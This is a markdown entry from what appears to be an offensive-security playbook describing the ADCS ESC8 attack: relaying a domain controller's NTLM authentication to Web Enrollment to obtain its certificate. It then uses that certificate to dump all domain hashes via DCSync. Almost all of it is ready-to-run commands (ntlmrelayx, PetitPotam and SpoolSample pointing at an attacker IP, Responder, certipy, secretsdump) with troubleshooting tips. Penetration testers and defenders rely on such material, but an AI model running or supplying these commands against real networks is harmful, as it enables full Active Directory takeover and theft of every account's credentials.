---
id: adcs-esc8
title: ADCS ESC8 — NTLM Relay to Web Enrollment
stage: privesc
tags: [windows, ad]
summary: Relay a domain controller's NTLM authentication to the ADCS Web Enrollment endpoint to obtain a DC certificate — then use it for DCSync without needing any DA credentials.
leads_to:
  - domain-admin
  - dcsync
---

## Prerequisites

ADCS with Web Enrollment enabled (HTTP endpoint at `http://CA/certsrv`). At least one other machine with SMB signing disabled, or ability to coerce DC authentication (PetitPotam, SpoolSample). The relay catches the DC machine account auth and uses it to request a certificate as the DC.

ESC8 is NTLM relay to ADCS. It's the combination of a relay target (ADCS Web Enrollment) and a coercion primitive (PetitPotam, Responder, SpoolSample). The DC machine account (`DC$`) has permissions to enroll in the `DomainController` template. Certificate for `DC$` → PKINIT auth as DC → DC's NT hash via U2U → DCSync.

## Quick Win

> Check if Web Enrollment is active — if certsrv responds, ESC8 is worth attempting.

```bash
curl -k http://$CA_IP/certsrv/
# 401 Unauthorized = Web Enrollment exists, attempt relay
```

## Step 1: Find Relay Targets

```bash
nxc smb 192.168.x.0/24 --gen-relay-list relay_targets.txt
```

## Step 2: Start ntlmrelayx to ADCS

```bash
impacket-ntlmrelayx \
  -t http://$CA_IP/certsrv/certfnsh.asp \
  -smb2support \
  --adcs \
  --template DomainController
# Wait for incoming auth — relay writes .pfx to disk
```

## Step 3: Coerce DC Authentication

```bash
# PetitPotam (unauthenticated on unpatched)
python3 PetitPotam.py ATTACKER_IP $DC_IP

# SpoolSample (requires creds)
python3 SpoolSample.py $DC_IP ATTACKER_IP

# Responder (passive — wait for broadcast)
sudo responder -I tun0 -wv
```

## Step 4: Authenticate with DC Certificate

```bash
# ntlmrelayx prints base64 cert or writes dc.pfx
# Authenticate and retrieve DC NT hash
certipy auth -pfx dc.pfx -dc-ip $DC_IP
# Output: Kerberos auth successful, NT hash: aad3b435...
```

## Step 5: DCSync with DC Hash

```bash
impacket-secretsdump -hashes :$DC_NT_HASH '$DOMAIN/DC$'@$DC_IP
# Dumps all domain account hashes including krbtgt and Administrator
```

## Troubleshooting

```bash
# If template DomainController not found, try:
--template Machine
--template KerberosAuthentication

# If relay fails — check CA hostname (not IP) is needed
-t http://CA_HOSTNAME/certsrv/certfnsh.asp
```

## Leads To

DC certificate → DC NT hash → DCSync all domain hashes (krbtgt, Administrator) → domain-admin and golden-ticket. No DA credentials required at any step — only network access and an unpatched ADCS server.
